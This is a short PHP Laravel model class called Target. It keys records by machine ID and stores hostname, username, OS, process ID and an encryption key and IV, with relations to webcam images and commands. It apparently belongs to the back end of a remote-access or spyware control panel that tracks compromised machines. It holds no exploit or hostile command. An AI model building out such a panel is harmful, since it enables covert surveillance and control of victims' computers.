<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;

class Target extends Model
{
    protected $primaryKey = 'machine_id';
    public $incrementing = false;
    protected $keyType = 'string';

    /**
     * The attributes that are mass assignable.
     *
     * @var list<string>
     */
    protected $fillable = [
        'machine_id',
        'hostname',
        'username',
        'os',
        'process_id',
        'key',
        'iv'
    ];

    /**
     * The attributes that should be hidden for serialization.
     *
     * @var list<string>
     */
    protected $hidden = [];

    public function webcamImages()
    {
        return $this->hasMany(Webcam::class, 'target_id', 'machine_id');
    }

    public function commands()
    {
        return $this->hasMany(Command::class, 'target_id', 'machine_id');
    }
}
